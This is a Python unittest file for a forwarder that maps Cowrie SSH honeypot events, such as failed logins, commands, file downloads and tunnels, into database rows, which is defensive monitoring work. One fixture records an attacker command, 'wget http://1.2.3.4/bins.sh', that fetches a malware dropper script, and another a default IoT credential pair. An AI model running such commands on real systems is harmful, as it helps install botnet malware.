#!/usr/bin/env python3
"""Tests for the event mapping.

map_event is the entire contract between the sensor and the database: whatever
it drops is gone permanently, because Cowrie's log rotates and there is no
second copy. It had no tests until three event types turned out to have been
silently discarded for the life of the project.

Stdlib only, matching the forwarder itself.
"""
import os
import unittest

# forwarder.py reads its config at import time.
os.environ.setdefault("FWD_BASE_URL", "https://example.invalid")
os.environ.setdefault("FWD_TOKEN", "test-token")

import forwarder  # noqa: E402


class TestMapEvent(unittest.TestCase):
    def test_login_failed_carries_the_credentials(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.login.failed", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "username": "root", "password": "xc3511",
        })
        self.assertEqual(kind, "event")
        self.assertEqual((row["username"], row["password"]), ("root", "xc3511"))
        self.assertNotIn("kind", row)

    def test_command_input_is_mapped_from_input_not_command(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.command.input", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "input": "wget http://1.2.3.4/bins.sh",
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["command"], "wget http://1.2.3.4/bins.sh")

    def test_file_download_uses_shasum(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.session.file_download", "timestamp": "2026-08-16T10:00:00.000Z",
            "shasum": "a" * 64, "size": 4096, "destfile": "/tmp/bins.sh",
        })
        self.assertEqual(kind, "file")
        self.assertEqual(row["sha256"], "a" * 64)

    # --- the three that were being discarded --------------------------------

    def test_client_version_is_captured(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.client.version", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "version": "SSH-2.0-libssh2_1.9.0",
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["kind"], "client")
        self.assertEqual(row["client_version"], "SSH-2.0-libssh2_1.9.0")
        self.assertEqual(row["session_id"], "s1")

    def test_client_kex_captures_the_hassh(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.client.kex", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1",
            "hassh": "06046964c022c6407d15a27b12a6a4fb",
            "kexAlgs": ["curve25519-sha256"],
        })
        self.assertEqual(row["kind"], "client")
        self.assertEqual(row["hassh"], "06046964c022c6407d15a27b12a6a4fb")

    def test_version_and_kex_share_a_session_so_they_can_be_merged(self):
        _, a = forwarder.map_event({
            "eventid": "cowrie.client.version", "session": "s1", "src_ip": "1.2.3.4",
            "timestamp": "2026-08-16T10:00:00.000Z", "version": "SSH-2.0-Go"})
        _, b = forwarder.map_event({
            "eventid": "cowrie.client.kex", "session": "s1", "src_ip": "1.2.3.4",
            "timestamp": "2026-08-16T10:00:01.000Z", "hassh": "deadbeef"})
        self.assertEqual(a["session_id"], b["session_id"])
        self.assertEqual(a["kind"], b["kind"])

    def test_direct_tcpip_request_becomes_a_tunnel(self):
        kind, row = forwarder.map_event({
            "eventid": "cowrie.direct-tcpip.request", "timestamp": "2026-08-16T10:00:00.000Z",
            "src_ip": "1.2.3.4", "session": "s1", "dst_ip": "smtp.example.com", "dst_port": 25,
        })
        self.assertEqual(kind, "event")
        self.assertEqual(row["kind"], "tunnel")
        self.assertEqual((row["dst_host"], row["dst_port"]), ("smtp.example.com", 25))

    def test_direct_tcpip_data_is_ignored(self):
        # One event per relayed chunk. Forwarding these would flood the batcher
        # for no analytic gain; the request already records the destination.
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.direct-tcpip.data", "session": "s1",
                                 "timestamp": "2026-08-16T10:00:00.000Z", "data": "x" * 500}),
            (None, None))

    def test_tunnel_without_a_destination_is_dropped(self):
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.direct-tcpip.request", "session": "s1",
                                 "timestamp": "2026-08-16T10:00:00.000Z"}),
            (None, None))

    # --- robustness ---------------------------------------------------------

    def test_a_line_with_no_eventid_does_not_raise(self):
        # map_event is called from the tail loop without a try, so an
        # AttributeError here would kill ingestion until someone noticed.
        self.assertEqual(forwarder.map_event({"timestamp": "2026-08-16T10:00:00.000Z"}),
                         (None, None))
        self.assertEqual(forwarder.map_event({"eventid": None}), (None, None))

    def test_an_unhandled_event_type_is_ignored(self):
        self.assertEqual(
            forwarder.map_event({"eventid": "cowrie.log.closed", "session": "s1"}),
            (None, None))

    def test_new_kinds_are_tagged_and_old_ones_are_not(self):
        # The backend routes on `kind`; an untagged row goes to cowrie_events.
        # If a plain event ever gained a `kind`, it would silently stop being
        # counted in the event total the whole dashboard is built on.
        for eid in ("cowrie.login.failed", "cowrie.command.input", "cowrie.session.connect"):
            _, row = forwarder.map_event({
                "eventid": eid, "timestamp": "2026-08-16T10:00:00.000Z",
                "src_ip": "1.2.3.4", "session": "s1", "input": "x"})
            self.assertNotIn("kind", row, f"{eid} must stay an untagged event")


if __name__ == "__main__":
    unittest.main()
